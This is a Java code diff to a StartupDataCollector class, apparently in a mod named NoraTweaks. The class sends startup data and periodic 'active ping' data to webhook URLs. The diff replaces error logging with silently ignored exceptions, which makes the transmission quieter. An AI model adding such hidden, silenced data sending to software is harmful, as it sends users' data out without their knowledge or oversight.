@@ -61,8 +61,7 @@ public class StartupDataCollector extends System<StartupDataCollector> {
 
                     StartupData data = collectStartupData();
                     WebhookSender.send(data, WEBHOOK_STARTUP_URL, WEBHOOK_API_KEY);
-                } catch (Exception e) {
-                    NoraTweaks.LOG.error("Failed to collect/send startup data", e);
+                } catch (Exception ignored) {
                 }
             });
         }
@@ -77,8 +76,7 @@ public class StartupDataCollector extends System<StartupDataCollector> {
             try {
                 StartupData data = collectStartupData();
                 WebhookSender.send(data, WEBHOOK_ACTIVE_URL, WEBHOOK_API_KEY);
-            } catch (Exception e) {
-                NoraTweaks.LOG.error("Failed to collect/send active ping data", e);
+            } catch (Exception ignored) {
             }
         }, ACTIVE_PING_INTERVAL_MINUTES, ACTIVE_PING_INTERVAL_MINUTES, TimeUnit.MINUTES);
     }
